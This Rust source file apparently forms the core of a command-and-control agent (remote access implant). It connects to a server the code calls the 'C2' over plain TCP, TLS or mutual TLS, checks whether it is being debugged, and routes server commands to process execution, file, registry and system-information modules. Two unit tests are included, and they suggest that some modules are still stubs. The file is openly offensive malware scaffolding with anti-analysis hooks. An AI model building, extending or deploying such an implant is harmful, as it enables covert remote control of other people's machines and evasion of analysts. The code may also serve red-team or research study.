use agent_hardening::anti_debug;
use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
use protocol::messages::{Command, Response};
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;

/// Connection mode for the agent.
#[derive(Default, Clone)]
pub enum ConnectionMode {
    /// Connect without TLS (cleartext).
    #[default]
    Plain,
    /// Connect with TLS but no client certificate.
    Tls {
        connector: std::sync::Arc<TlsConnector>,
        server_name: String,
    },
    /// Connect with mTLS (client certificate presented).
    Mtls {
        connector: std::sync::Arc<TlsConnector>,
        server_name: String,
    },
}

pub struct AgentCore {
    pub id: u32,
    /// How this agent connects to the C2.
    pub connection_mode: ConnectionMode,
}

impl AgentCore {
    #[must_use]
    pub fn new(id: u32) -> Self {
        Self {
            id,
            connection_mode: ConnectionMode::Plain,
        }
    }

    /// Create an agent that connects using TLS (server-auth only).
    pub fn with_tls(id: u32, ca_cert_path: &str, server_name: &str) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let connector = build_tls_connector(ca_cert, None, None)?;
        Ok(Self {
            id,
            connection_mode: ConnectionMode::Tls {
                connector: std::sync::Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Create an agent that connects using mTLS (mutual authentication).
    pub fn with_mtls(
        id: u32,
        ca_cert_path: &str,
        client_cert_path: &str,
        client_key_path: &str,
        server_name: &str,
    ) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let client_certs = load_certs(client_cert_path)?;
        let client_key = load_private_key(client_key_path)?;
        let connector =
            build_tls_connector(ca_cert, Some(client_certs), Some(client_key))?;
        Ok(Self {
            id,
            connection_mode: ConnectionMode::Mtls {
                connector: std::sync::Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Connect to a C2 server at the given address.
    ///
    /// If TLS/mTLS is configured, the TCP stream is wrapped before returning.
    pub async fn connect(&self, addr: &SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
        let stream = TcpStream::connect(addr).await?;
        log::info!("Agent {} connected to {addr}", self.id);

        // Extract the Arc<Connector> and name before the .await boundary.
        let (connector_opt, server_name) = match &self.connection_mode {
            ConnectionMode::Tls {
                connector,
                server_name,
            }
            | ConnectionMode::Mtls {
                connector,
                server_name,
            } => (Some(std::sync::Arc::clone(connector)), Some(server_name.clone())),
            ConnectionMode::Plain => (None, None),
        };

        if let (Some(connector), Some(name_str)) = (connector_opt, server_name) {
            // Use an owned String so ServerName gets 'static lifetime.
            let owned_name: String = name_str;
            let name: rustls_pki_types::ServerName<'static> = owned_name
                .try_into()
                .map_err(|_| "invalid DNS name")?;
            let _tls_stream = connector.connect(name, stream).await?;
            log::info!("TLS handshake completed for agent {}", self.id);
        } else {
            log::info!("Agent {} connected in cleartext mode", self.id);
        }

        Ok(())
    }

    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        if anti_debug::is_being_debugged() {
            log::warn!("Agent is being debugged");
        }

        match cmd {
            cmd_ref @ Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(cmd_ref).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(cmd_ref).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(cmd_ref).await
                } else {
                    process_manager::execute(cmd_ref).await
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    pub fn heartbeat(&self) -> Response {
        Response::Success
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        assert_eq!(
            response,
            Some(Response::Failure {
                error: "process management is not implemented".to_string(),
            })
        );
    }

    #[test]
    fn agent_connection_mode_defaults_to_plain() {
        let agent = AgentCore::new(1);
        assert!(matches!(agent.connection_mode, super::ConnectionMode::Plain));
    }
}
